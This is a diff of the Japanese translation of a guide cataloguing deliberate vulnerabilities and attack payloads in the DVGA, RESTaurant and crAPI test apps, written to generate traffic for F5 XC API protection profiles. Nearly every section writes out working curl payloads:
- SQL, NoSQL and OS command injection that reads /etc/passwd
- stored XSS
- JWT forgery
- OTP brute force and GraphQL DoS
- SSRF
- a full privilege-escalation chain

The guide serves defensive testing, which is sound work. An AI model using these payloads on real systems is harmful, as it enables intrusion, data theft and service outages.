@@ -12,7 +12,7 @@ i18n:
 
 ## 概要
 
-このガイドでは、3つのAPIセキュリティテストアプリケーション全体のAPIエンドポイント、意図的な脆弱性、および攻撃ペイロードをすべてカタログ化しています。F5 XC API保護プロファイル開発のためのトラフィック生成パターンの構築にご活用ください。
+このガイドでは、3つのAPIセキュリティテストアプリケーション全体にわたるすべてのAPIエンドポイント、意図的な脆弱性、および攻撃ペイロードをカタログ化しています。F5 XC API保護プロファイル開発のためのトラフィック生成パターンの構築にご活用ください。
 
 | アプリケーション | プロトコル | パス | ポート | 認証 | 脆弱性 |
 |---|---|---|---|---|---|
@@ -35,7 +35,7 @@ CRAPI="http://<ORIGIN_IP>:8888"
 **GraphiQL IDE:** `GET ${ORIGIN}/dvga/`
 **管理者認証情報:** admin / password
 
-DVGAのすべてのインタラクションは、JSON `{"query":"..."}` ペイロードを含むPOSTリクエストで単一のエンドポイント（`/dvga/graphql`）を使用します。
+DVGAのすべてのインタラクションは、JSON `{"query":"..."}` ペイロードを含むPOSTリクエストで単一のエンドポイント(`/dvga/graphql`)を使用します。
 
 ### スキーマ概要
 
@@ -48,21 +48,21 @@ Types:    PasteObject (id, title, content, public, owner, ipAddr, userAgent)
 
 ### エンドポイントリファレンス
 
-| オペレーション | タイプ | 認証 | 目的 |
+| 操作 | タイプ | 認証 | 目的 |
 |---|---|---|---|
-| `pastes(public, filter, limit)` | Query | なし | ペーストの一覧表示（filterによるSQLインジェクション） |
+| `pastes(public, filter, limit)` | Query | なし | ペースト一覧（filterを介したSQLインジェクション） |
 | `paste(id)` | Query | なし | 単一ペーストの取得 |
-| `me(token)` | Query | なし | JWTによるユーザー取得（偽造に脆弱） |
+| `me(token)` | Query | なし | JWTによるユーザー取得（偽造に対して脆弱） |
 | `systemHealth` | Query | なし | ヘルスチェック |
 | `systemUpdate` | Query | なし | 低速クエリ（約82秒、DoSベクター） |
-| `systemDiagnostics(cmd)` | Query | admin/password | ホワイトリスト登録済みOSコマンドの実行 |
-| `createPaste(title, content, public)` | Mutation | なし | ペーストの作成（contentによるXSS） |
+| `systemDiagnostics(cmd)` | Query | admin/password | ホワイトリストされたOSコマンドの実行 |
+| `createPaste(title, content, public)` | Mutation | なし | ペーストの作成（contentを介したXSS） |
 | `importPaste(host, port, path, scheme)` | Mutation | なし | リモートペーストのインポート（SSRF、コマンドインジェクション） |
 | `uploadPaste(filename, content)` | Mutation | なし | ペーストのアップロード（パストラバーサル） |
 
 ### 脆弱性カタログ
 
-#### 1. サービス拒否（6シナリオ）
+#### 1. サービス拒否攻撃（6シナリオ）
 
 **バッチクエリ攻撃:**
 ```bash
@@ -71,7 +71,7 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '[{"query":"{systemUpdate}"},{"query":"{systemUpdate}"},{"query":"{systemUpdate}"}]'
 ```
 
-**深い再帰（循環するOwner/Paste参照）:**
+**深い再帰（Owner/Pasteの循環参照）:**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -85,14 +85,14 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '{"query":"{systemUpdate}"}'
 ```
 
-**フィールド重複（フィールドを500回以上繰り返す）:**
+**フィールド重複（フィールドを500回以上繰り返し）:**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{pastes{title title title title title title title title title title title title title title title title title title title title}}"}'
 ```
 
-**エイリアスベースの攻撃（1000個のエイリアス付きオペレーション）:**
+**エイリアスベースの攻撃（1000のエイリアス操作）:**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -108,14 +108,14 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}'
 ```
 
-**フィールドサジェスション（タイポにより有効なフィールドが漏洩）:**
+**フィールドサジェスチョン（タイプミスで有効なフィールドが漏洩）:**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{pastes{titl}}"}'
 ```
 
-**importPasteによるSSRF（内部サービスの探査）:**
+**importPasteを介したSSRF（内部サービスの探査）:**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -124,21 +124,21 @@ curl -X POST ${ORIGIN}/dvga/graphql \
 
 #### 3. インジェクション（4シナリオ）
 
-**filterパラメータによるSQLインジェクション:**
+**filterパラメータを介したSQLインジェクション:**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{pastes(filter:\"aaa\\u0027 OR 1=1--\"){id title content public}}"}'
 ```
 
-**createPasteによるストアドXSS:**
+**createPasteを介した蓄積型XSS:**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"mutation{createPaste(title:\"<img src=x onerror=alert(1)>\",content:\"xss\",public:true){paste{id title}}}"}'
 ```
 
-**ログインジェクション（オペレーション名のなりすまし）:**
+**ログインジェクション（オペレーション名のスプーフィング）:**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -147,14 +147,14 @@ curl -X POST ${ORIGIN}/dvga/graphql \
 
 #### 4. コード実行（3シナリオ）
 
-**importPasteによるOSコマンドインジェクション:**
+**importPasteを介したOSコマンドインジェクション:**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"mutation{importPaste(host:\"localhost\",port:80,path:\"/ ; uname -a\",scheme:\"http\"){result}}"}'
 ```
 
-**systemDiagnosticsによるOSコマンド（管理者認証が必要）:**
+**systemDiagnosticsを介したOSコマンド（管理者認証が必要）:**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -163,14 +163,14 @@ curl -X POST ${ORIGIN}/dvga/graphql \
 
 #### 5. 認可バイパス（3シナリオ）
 
-**JWTトークン偽造（署名なしトークンを受け入れる）:**
+**JWTトークン偽造（未署名トークンを受け入れ）:**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{me(token:\"eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.\"){username}}"}'
 ```
 
-**uploadPasteによる任意ファイル書き込み（パストラバーサル）:**
+**uploadPasteを介した任意ファイル書き込み（パストラバーサル）:**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -183,7 +183,7 @@ curl -X POST ${ORIGIN}/dvga/graphql \
 
 **Swagger UI:** `${ORIGIN}/restaurant/docs`
 **OpenAPI仕様:** `${ORIGIN}/restaurant/openapi.json`
-**認証:** フォームエンコードPOSTによるJWT（`/restaurant/token`）
+**認証:** フォームエンコードPOSTによるJWT（`/restaurant/token`宛）
 **ロール:** Customer（デフォルト）、Employee、Chef（管理者）
 
 ### セットアップ: ユーザー登録と認証
@@ -207,26 +207,26 @@ echo "Bearer token: ${TOKEN}"
 | エンドポイント | メソッド | 認証 | ロール | 脆弱性 |
 |---|---|---|---|---|
 | `/restaurant/register` | POST | なし | — | ユーザー作成 |
-| `/restaurant/token` | POST | なし | — | 弱いシークレット(97952)によるJWT |
+| `/restaurant/token` | POST | なし | — | 弱い秘密鍵のJWT (97952) |
 | `/restaurant/healthcheck` | GET | なし | — | ヘルスチェック |
-| `/restaurant/profile` | GET | あり | 全て | ユーザープロファイル |
-| `/restaurant/profile` | PUT | あり | 全て | **BOLA**（他ユーザーの変更） |
-| `/restaurant/profile` | PATCH | あり | 全て | **BOPLA**（ロールの一括割り当て） |
-| `/restaurant/users/update_role` | PUT | あり | 全て | **BFLA**（ロールエスカレーション） |
-| `/restaurant/menu` | GET | あり | 全て | メニュー項目の一覧 |
-| `/restaurant/menu` | PUT | あり | Employee以上 | メニュー作成（画像による**SSRF**） |
-| `/restaurant/menu/{item_id}` | PUT | あり | Employee以上 | メニュー更新（画像による**SSRF**） |
-| `/restaurant/menu/{item_id}` | DELETE | あり | 全て | **BFLA**（全ユーザーが削除可能） |
-| `/restaurant/orders` | GET | あり | 全て | **BOLA**（全注文の閲覧） |
-| `/restaurant/orders` | POST | あり | 全て | 注文の作成 |
-| `/restaurant/orders/{order_id}` | GET | あり | 全て | **BOLA**（他ユーザーの注文へのアクセス） |
-| `/restaurant/orders/status/{order_id}` | GET | あり | 全て | 注文ステータス |
+| `/restaurant/profile` | GET | あり | 任意 | ユーザープロファイル |
+| `/restaurant/profile` | PUT | あり | 任意 | **BOLA**（他ユーザーの変更） |
+| `/restaurant/profile` | PATCH | あり | 任意 | **BOPLA**（ロールのマスアサインメント） |
+| `/restaurant/users/update_role` | PUT | あり | 任意 | **BFLA**（ロールエスカレーション） |
+| `/restaurant/menu` | GET | あり | 任意 | メニュー項目の一覧 |
+| `/restaurant/menu` | PUT | あり | Employee以上 | メニュー作成（画像を介した**SSRF**） |
+| `/restaurant/menu/{item_id}` | PUT | あり | Employee以上 | メニュー更新（画像を介した**SSRF**） |
+| `/restaurant/menu/{item_id}` | DELETE | あり | 任意 | **BFLA**（任意のユーザーが削除可能） |
+| `/restaurant/orders` | GET | あり | 任意 | **BOLA**（全注文の閲覧） |
+| `/restaurant/orders` | POST | あり | 任意 | 注文の作成 |
+| `/restaurant/orders/{order_id}` | GET | あり | 任意 | **BOLA**（他の注文へのアクセス） |
+| `/restaurant/orders/status/{order_id}` | GET | あり | 任意 | 注文ステータス |
 | `/restaurant/admin/stats/disk` | GET | あり | Chef | **コマンドインジェクション** |
 | `/restaurant/reset-password` | POST | なし | — | パスワードリセット要求 |
 | `/restaurant/reset-password/new-password` | POST | なし | — | 新しいパスワードの設定 |
-| `/restaurant/referral-code` | GET | あり | 全て | リファラルコードの取得 |
-| `/restaurant/apply-referral` | POST | あり | 全て | リファラルの適用 |
-| `/restaurant/discount-coupons` | GET | あり | 全て | クーポンの一覧 |
+| `/restaurant/referral-code` | GET | あり | 任意 | リファラルコードの取得 |
+| `/restaurant/apply-referral` | POST | あり | 任意 | リファラルの適用 |
+| `/restaurant/discount-coupons` | GET | あり | 任意 | クーポン一覧 |
 
 ### 脆弱性カタログ
 
@@ -240,7 +240,7 @@ curl -X PUT ${ORIGIN}/restaurant/profile \
   -d '{"username":"chef","phone_number":"hacked","first_name":"Pwned","last_name":"User"}'
 ```
 
-**他ユーザーの注文へのアクセス（オフセットの列挙）:**
+**他のユーザーの注文にアクセス（オフセットの列挙）:**
 ```bash
 for i in 1 2 3 4 5; do
   curl -sf ${ORIGIN}/restaurant/orders/${i} \
@@ -251,20 +251,20 @@ done
 
 #### API2:2023 — 認証の不備
 
-**JWT弱いシークレットのブルートフォース（シークレットは6桁: 97952）:**
+**JWT弱い秘密鍵のブルートフォース（秘密鍵は6桁: 97952）:**
 ```bash
-# jwt.ioでトークンをデコードして偽造
-# シークレット: 97952（hashcat -a 3 -m 16500 token '?d?d?d?d?d?d' でブルートフォース可能）
+# jwt.ioでトークンのデコードと偽造
+# 秘密鍵: 97952 (hashcat -a 3 -m 16500 token '?d?d?d?d?d?d' でブルートフォース可能)
 
 # Chefトークンの偽造:
 # Header: {"alg":"HS256","typ":"JWT"}
 # Payload: {"sub":"chef","exp":9999999999}
-# シークレット 97952 で署名
+# 秘密鍵 97952 で署名
 ```
 
 #### API3:2023 — オブジェクトプロパティレベル認可の不備 (BOPLA)
 
-**ロールをCustomerからChefに一括割り当て:**
+**CustomerからChefへのロールのマスアサインメント:**
 ```bash
 curl -X PATCH ${ORIGIN}/restaurant/profile \
   -H "Authorization: Bearer ${TOKEN}" \
@@ -289,7 +289,7 @@ curl -X PATCH ${ORIGIN}/restaurant/profile \
 
 #### API5:2023 — 機能レベル認可の不備 (BFLA)
 
-**Customerとしてメニュー項目を削除（Employee以上が必要なはず）:**
+**Customerとしてメニュー項目を削除（Employee以上が必要）:**
 ```bash
 curl -X DELETE ${ORIGIN}/restaurant/menu/1 \
   -H "Authorization: Bearer ${TOKEN}"
@@ -305,9 +305,9 @@ curl -X PUT ${ORIGIN}/restaurant/users/update_role \
 
 #### API7:2023 — サーバーサイドリクエストフォージェリ (SSRF)
 
-**メニューのimage_urlによる内部エンドポイントの探査（Employeeロールが必要）:**
+**メニューのimage_urlを介して内部エンドポイントを探査（Employeeロールが必要）:**
 ```bash
-# まずBOPLAでEmployeeにエスカレーションしてから:
+# まずBOPLAを使ってEmployeeにエスカレーションしてから:
 curl -X PUT ${ORIGIN}/restaurant/menu \
   -H "Authorization: Bearer ${TOKEN}" \
   -H "Content-Type: application/json" \
@@ -316,7 +316,7 @@ curl -X PUT ${ORIGIN}/restaurant/menu \
 
 #### API8:2023 — インジェクション
 
-**ディスク統計によるOSコマンドインジェクション（Chefロールが必要）:**
+**ディスク統計を介したOSコマンドインジェクション（Chefロールが必要）:**
 ```bash
 # Chefにエスカレーション後:
 curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;whoami" \
@@ -326,7 +326,7 @@ curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;cat%20/etc/passwd" \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-### 完全な攻撃チェーン: CustomerからRootまで
+### 完全な攻撃チェーン: Customerからルートまで
 
 ```bash
 # 1. 登録
@@ -358,11 +358,11 @@ curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;id" \
 ## crAPI (OWASP Completely Ridiculous API)
 
 **Web UI:** `${CRAPI}/`
-**MailHog:** `${CRAPI}/mailhog/`（認証用メールキャプチャ）
-**認証:** JWT Bearerトークン（RS256、アルゴリズム混同に脆弱）
-**アーキテクチャ:** 7つのマイクロサービス（identity、community、workshop、postgres、mongo、mailhog、web）
+**MailHog:** `${CRAPI}/mailhog/`（検証用メールキャプチャ）
+**認証:** JWT Bearerトークン（RS256、アルゴリズム混乱に対して脆弱）
+**アーキテクチャ:** 7つのマイクロサービス（identity, community, workshop, postgres, mongo, mailhog, web）
 
-### セットアップ: 登録、メール認証、ログイン
+### セットアップ: ユーザー登録、メール検証、ログイン
 
 ```bash
 # 1. 登録
@@ -370,7 +370,7 @@ curl -X POST ${CRAPI}/identity/api/auth/signup \
   -H "Content-Type: application/json" \
   -d '{"name":"Test User","email":"tester@example.com","number":"5551234567","password":"TestPass123"}'
 
-# 2. MailHogで認証メールを確認
+# 2. MailHogで検証メールを確認
 # ${CRAPI}/mailhog/ をブラウザで開くか、MailHog APIを使用:
 curl -sf ${CRAPI}/mailhog/api/v2/messages | python3 -c "
 import sys,json
@@ -394,24 +394,24 @@ echo "Bearer token: ${TOKEN}"
 | エンドポイント | メソッド | 認証 | 脆弱性 |
 |---|---|---|---|
 | `/identity/api/auth/signup` | POST | なし | 登録 |
-| `/identity/api/auth/login` | POST | なし | JWTトークン（アルゴリズム混同） |
-| `/identity/api/auth/forget-password` | POST | なし | OTPリクエスト |
+| `/identity/api/auth/login` | POST | なし | JWTトークン（アルゴリズム混乱） |
+| `/identity/api/auth/forget-password` | POST | なし | OTP要求 |
 | `/identity/api/auth/v2/check-otp` | POST | なし | **レート制限なし**（4桁OTPのブルートフォース） |
 | `/identity/api/auth/v3/check-otp` | POST | なし | レート制限付きバージョン |
 | `/identity/api/v2/user/dashboard` | GET | あり | ユーザープロファイル |
 | `/identity/api/v2/user/change-email` | PUT | あり | メール変更 |
 | `/identity/api/v2/vehicle/vehicles` | GET | あり | 車両一覧（UUIDの漏洩） |
-| `/identity/api/v2/vehicle/{uuid}/location` | GET | あり | **BOLA**（任意ユーザーの車両） |
+| `/identity/api/v2/vehicle/{uuid}/location` | GET | あり | **BOLA**（任意のユーザーの車両） |
 | `/identity/api/v2/user/videos` | POST | あり | 動画アップロード |
-| `/identity/api/v2/user/videos/{id}` | GET | あり | **データ漏洩**（conversion_params） |
-| `/identity/api/v2/user/videos/{id}` | PUT | あり | **一括割り当て**（コマンドインジェクション） |
+| `/identity/api/v2/user/videos/{id}` | GET | あり | **データ露出**（conversion_params） |
+| `/identity/api/v2/user/videos/{id}` | PUT | あり | **マスアサインメント**（コマンドインジェクション） |
 | `/identity/api/v2/admin/videos/{id}` | DELETE | あり | **BFLA**（管理者チェックなし） |
 
 #### Communityサービス
 
 | エンドポイント | メソッド | 認証 | 脆弱性 |
 |---|---|---|---|
-| `/community/api/v2/community/posts` | GET | あり | **データ漏洩**（vehicle_id、emailの漏洩） |
+| `/community/api/v2/community/posts` | GET | あり | **データ露出**（vehicle_id、メールの漏洩） |
 | `/community/api/v2/community/posts` | POST | あり | ブログ投稿の作成 |
 | `/community/api/v2/community/posts/{id}/comments` | POST | あり | コメントの追加 |
 | `/community/api/v2/coupon/validate-coupon` | POST | あり | **NoSQLインジェクション** |
@@ -420,14 +420,14 @@ echo "Bearer token: ${TOKEN}"
 
 | エンドポイント | メソッド | 認証 | 脆弱性 |
 |---|---|---|---|
-| `/workshop/api/mechanic` | GET | あり | **データ漏洩**（整備士のメールアドレス） |
+| `/workshop/api/mechanic` | GET | あり | **データ露出**（整備士のメール） |
 | `/workshop/api/mechanic/mechanic_report` | GET | なし | **BOLA**（認証なし、連番ID） |
 | `/workshop/api/merchant/contact_mechanic` | POST | あり | **SSRF** + **DoS** |
 | `/workshop/api/shop/products` | GET | あり | 商品カタログ |
 | `/workshop/api/shop/orders/` | POST | あり | 注文の作成 |
 | `/workshop/api/shop/orders/all` | GET | あり | 注文の一覧 |
 | `/workshop/api/shop/orders/{id}` | GET | なし | **BOLA**（認証不要） |
-| `/workshop/api/shop/orders/{id}` | PUT | あり | **一括割り当て**（status、quantity） |
+| `/workshop/api/shop/orders/{id}` | PUT | あり | **マスアサインメント**（status, quantity） |
 | `/workshop/api/shop/apply_coupon` | POST | あり | **SQLインジェクション** |
 
 ### チャレンジカタログ
@@ -439,7 +439,7 @@ echo "Bearer token: ${TOKEN}"
 curl -sf ${CRAPI}/identity/api/v2/vehicle/vehicles \
   -H "Authorization: Bearer ${TOKEN}"
 
-# 他のユーザーの車両にアクセス（UUIDを置き換え）
+# 他のユーザーの車両にアクセス（UUIDを置換）
 curl -sf ${CRAPI}/identity/api/v2/vehicle/VICTIM-UUID-HERE/location \
   -H "Authorization: Bearer ${TOKEN}"
 ```
@@ -447,7 +447,7 @@ curl -sf ${CRAPI}/identity/api/v2/vehicle/VICTIM-UUID-HERE/location \
 #### チャレンジ2 — BOLA: 整備士レポートへのアクセス（認証なし）
 
 ```bash
-# 連番ID列挙 — トークン不要
+# 連番IDの列挙 — トークン不要
 for i in 1 2 3 4 5; do
   echo "Report $i:"
   curl -sf "${CRAPI}/workshop/api/mechanic/mechanic_report?report_id=${i}"
@@ -458,7 +458,7 @@ done
 #### チャレンジ3 — 認証の不備: パスワードリセットOTPのブルートフォース
 
 ```bash
-# 被害者のOTPをリクエスト
+# 被害者のOTPを要求
 curl -X POST ${CRAPI}/identity/api/auth/forget-password \
   -H "Content-Type: application/json" \
   -d '{"email":"victim@example.com"}'
@@ -472,23 +472,23 @@ for otp in $(seq -w 0000 9999); do
 done
 ```
 
-#### チャレンジ4 — データ漏洩: 整備士のメールアドレスの漏洩
+#### チャレンジ4 — データ露出: 整備士メールアドレスの漏洩
 
 ```bash
 curl -sf ${CRAPI}/workshop/api/mechanic \
   -H "Authorization: Bearer ${TOKEN}" | python3 -m json.tool
 ```
 
-#### チャレンジ5 — データ漏洩: 内部動画変換パラメータ
+#### チャレンジ5 — データ露出: 内部動画変換パラメータ
 
 ```bash
-# 動画をアップロードしてからレスポンスを調査
+# 動画をアップロードしてレスポンスを確認
 curl -sf ${CRAPI}/identity/api/v2/user/videos \
   -H "Authorization: Bearer ${TOKEN}" | python3 -m json.tool
-# レスポンス内のconversion_paramsフィールドを確認
+# レスポンスのconversion_paramsフィールドを確認
 ```
 
-#### チャレンジ6 — DoS: Contact Mechanicによるレイヤー7攻撃
+#### チャレンジ6 — DoS: 整備士連絡機能を介したレイヤー7攻撃
 
 ```bash
 curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
@@ -504,7 +504,7 @@ curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
   }'
 ```
 
-#### チャレンジ7 — BFLA: 管理者エンドポイントによる動画の削除
+#### チャレンジ7 — BFLA: 管理者エンドポイントを介した動画の削除
 
 ```bash
 # 一般ユーザーが管理者エンドポイントにアクセス可能
@@ -512,7 +512,7 @@ curl -X DELETE ${CRAPI}/identity/api/v2/admin/videos/VIDEO_ID_HERE \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-#### チャレンジ8 & 9 — 一括割り当て: 注文操作による無料アイテムの取得
+#### チャレンジ8 & 9 — マスアサインメント: 注文操作による無料商品の取得
 
 ```bash
 # GETをPUTに変更し、statusとquantityを変更
@@ -522,7 +522,7 @@ curl -X PUT ${CRAPI}/workshop/api/shop/orders/1 \
   -d '{"status":"returned","quantity":100}'
 ```
 
-#### チャレンジ10 — 動画変換パラメータによるコマンドインジェクション
+#### チャレンジ10 — 動画変換パラメータを介したコマンドインジェクション
 
 ```bash
 curl -X PUT ${CRAPI}/identity/api/v2/user/videos/VIDEO_ID \
@@ -531,7 +531,7 @@ curl -X PUT ${CRAPI}/identity/api/v2/user/videos/VIDEO_ID \
   -d '{"conversion_params":"-v codec h264; cat /etc/passwd"}'
 ```
 
-#### チャレンジ11 — Contact MechanicによるSSRF
+#### チャレンジ11 — 整備士連絡機能を介したSSRF
 
 ```bash
 curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
@@ -565,7 +565,7 @@ curl -X POST ${CRAPI}/workshop/api/shop/apply_coupon \
   -d "{\"coupon_code\":\"TRAC075' OR '1'='1\"}"
 ```
 
-#### チャレンジ14 — 未認証での注文アクセス
+#### チャレンジ14 — 未認証の注文アクセス
 
 ```bash
 # Authorizationヘッダーなし — それでもデータが返される
@@ -575,13 +575,13 @@ for i in 1 2 3 4 5; do
 done
 ```
 
-#### チャレンジ15 — JWTアルゴリズム混同
+#### チャレンジ15 — JWTアルゴリズム混乱
 
 ```bash
 # アルゴリズム "none" でJWTを偽造（署名検証なし）:
 # 1. ヘッダーを設定: {"alg":"none","typ":"JWT"} をbase64urlエンコード
 # 2. ペイロードを設定: {"email":"admin@example.com","role":"admin"} をbase64urlエンコード
-# 3. ドットで結合し、署名は空: <header>.<payload>.
+# 3. ドットで結合し、署名を空にする: <header>.<payload>.
 HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
 PAYLOAD=$(echo -n '{"email":"admin@example.com","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
 FORGED="${HEADER}.${PAYLOAD}."
@@ -596,29 +596,29 @@ curl -sf ${CRAPI}/identity/api/v2/user/dashboard \
 
 | OWASPカテゴリ | DVGA | RESTaurant | crAPI |
 |---|---|---|---|
-| **API1: BOLA** | — | `PUT /profile`、`GET /orders/{id}` | 車両位置情報、整備士レポート、注文 |
-| **API2: 認証の不備** | JWTの偽造（`me`クエリ） | JWT弱いシークレット (97952) | OTPブルートフォース (v2)、JWTアルゴリズム混同 |
-| **API3: BOPLA** | — | `PATCH /profile`（ロールエスカレーション） | 動画conversion_params、整備士メールの漏洩 |
-| **API4: リソース消費** | バッチ、再帰、エイリアス、フィールド重複DoS | レスポンス長によるユーザー列挙 | `contact_mechanic` repeat_request DoS |
-| **API5: BFLA** | — | `DELETE /menu`、`PUT /users/update_role` | 一般ユーザーとして`DELETE /admin/videos` |
-| **API6: 一括割り当て** | — | `PUT /orders`（status、quantity） | 注文のstatus/quantity、動画conversion_params |
+| **API1: BOLA** | — | `PUT /profile`, `GET /orders/{id}` | 車両位置情報、整備士レポート、注文 |
+| **API2: 認証の不備** | JWTの偽造（`me`クエリ） | JWT弱い秘密鍵 (97952) | OTPブルートフォース (v2)、JWTアルゴリズム混乱 |
+| **API3: BOPLA** | — | `PATCH /profile`（ロールエスカレーション） | 動画conversion_params、整備士メール露出 |
+| **API4: リソース消費** | バッチ、再帰、エイリアス、フィールド重複によるDoS | レスポンス長を利用したユーザー列挙 | `contact_mechanic` repeat_request DoS |
+| **API5: BFLA** | — | `DELETE /menu`, `PUT /users/update_role` | 一般ユーザーとして `DELETE /admin/videos` |
+| **API6: マスアサインメント** | — | `PUT /orders`（status, quantity） | 注文のstatus/quantity、動画conversion_params |
 | **API7: SSRF** | `importPaste`ミューテーション | `PUT /menu` image_url | `contact_mechanic` mechanic_api URL |
-| **API8: インジェクション** | SQL（`filter`）、XSS（`content`）、OSコマンド（`importPaste`、`systemDiagnostics`） | OSコマンド（`/admin/stats/disk?parameters=`） | NoSQL（`validate-coupon`）、SQL（`apply_coupon`） |
-| **API9: 不適切な資産管理** | — | — | 非推奨の`/auth/v2/check-otp`（レート制限なし） |
-| **API10: 安全でない利用** | — | — | （SSRFによる間接的なもの） |
-| **GraphQL固有** | イントロスペクション、バッチング、再帰、エイリアス、フィールド重複、循環フラグメント | — | — |
+| **API8: インジェクション** | SQL (`filter`)、XSS (`content`)、OSコマンド (`importPaste`, `systemDiagnostics`) | OSコマンド (`/admin/stats/disk?parameters=`) | NoSQL (`validate-coupon`)、SQL (`apply_coupon`) |
+| **API9: 不適切な資産管理** | — | — | 非推奨の `/auth/v2/check-otp`（レート制限なし） |
+| **API10: 安全でないAPI消費** | — | — | （SSRFを介した間接的利用） |
+| **GraphQL固有** | イントロスペクション、バッチ処理、再帰、エイリアス、フィールド重複、循環フラグメント | — | — |
 
 ---
 
 ## トラフィック生成パターン
 
-### フェーズ1: ベースライン（正常パス）
+### フェーズ1: ベースライン（ハッピーパス）
 
-攻撃パターンをテストする前に、正常なAPI動作を確立するために正規のトラフィックを生成します。
+攻撃パターンのテスト前に、通常のAPI動作を確立するための正規トラフィックを生成します。
 
 **DVGAベースライン:**
 ```bash
-# 正常なクエリ
+# 通常のクエリ
 curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"{pastes{id title}}"}'
 curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"mutation{createPaste(title:\"note\",content:\"hello\",public:true){paste{id}}}"}'
 ```
@@ -641,29 +641,29 @@ curl -sf ${CRAPI}/community/api/v2/community/posts -H "Authorization: Bearer ${T
 
 **BOLAテスト:** 連番IDの列挙、リクエスト内のユーザー識別子の入れ替え、所有権なしでのリソースアクセス。
 
-**インジェクションテスト:** filter/couponパラメータへのSQLペイロード、GraphQLクエリインジェクション、パラメータフィールドによるOSコマンドインジェクション。
+**インジェクションテスト:** filter/couponパラメータへのSQLペイロード、GraphQLクエリインジェクション、パラメータフィールドを介したOSコマンドインジェクション。
 
-**認証バイパステスト:** JWTトークンの偽造、OTPのブルートフォース、非推奨APIバージョンの使用、アルゴリズム混同。
+**認証バイパステスト:** JWTトークンの偽造、OTPのブルートフォース、非推奨APIバージョンの使用、アルゴリズム混乱。
 
 **SSRFテスト:** `importPaste`、`image_url`、`mechanic_api`パラメータへの内部URL。
 
-**DoSテスト:** GraphQLバッチ/再帰/エイリアス攻撃、高カウントでの`repeat_request_if_failed`。
+**DoSテスト:** GraphQLバッチ/再帰/エイリアス攻撃、高カウント値での`repeat_request_if_failed`。
 
 ### フェーズ3: ステートフルな攻撃チェーン
 
-一部の攻撃には状態を伴うマルチステップシーケンスが必要です:
+一部の攻撃では、状態を持つマルチステップシーケンスが必要です:
 
-1. **RESTaurantエスカレーションチェーン:** 登録 → トークン取得 → PATCHでChefにロール変更 → 再認証 → コマンドインジェクション
-2. **crAPIフルフロー:** サインアップ → メール認証（MailHog） → ログイン → 車両追加 → Contact mechanic（SSRF） → 注文操作
-3. **DVGA偵察からエクスプロイトまで:** イントロスペクション → systemDiagnosticsの発見 → 管理者認証情報のブルートフォース → OSコマンド実行
+1. **RESTaurantエスカレーションチェーン:** 登録 → トークン → PATCHでロールをChefに変更 → 再認証 → コマンドインジェクション
+2. **crAPI完全フロー:** サインアップ → メール検証（MailHog） → ログイン → 車両追加 → 整備士連絡（SSRF） → 注文操作
+3. **DVGA偵察から攻撃まで:** イントロスペクション → systemDiagnosticsの発見 → 管理者認証情報のブルートフォース → OSコマンド実行
 
-### レート推奨事項
+### レートの推奨事項
 
-| パターン | リクエスト/秒 | 期間 | 備考 |
+| パターン | リクエスト/秒 | 継続時間 | 備考 |
 |---|---|---|---|
-| ベースライン（アプリごと） | 10-50 | 5分 | 正常なトラフィックフィンガープリントの確立 |
+| ベースライン（アプリごと） | 10-50 | 5分 | 通常トラフィックのフィンガープリントを確立 |
 | BOLA列挙 | 100-500 | 2分 | 連番IDスキャン |
-| OTPブルートフォース | 1000+ | 発見まで | 最大10,000回の試行（4桁） |
-| GraphQL DoS | 10-50 | 30秒 | 各リクエストがサーバー側で高負荷 |
+| OTPブルートフォース | 1000以上 | 発見まで | 最大10,000試行（4桁） |
+| GraphQL DoS | 10-50 | 30秒 | 各リクエストはサーバー側で高負荷 |
 | インジェクションファジング | 50-200 | 5分 | リクエストごとにペイロードを変更 |
-| SSRF探査 | 5-20 | 2分 | 低速; 各リクエストがサーバー側HTTPリクエストをトリガー |
+| SSRFプロービング | 5-20 | 2分 | 低速; 各リクエストがサーバー側HTTPリクエストを発生 |
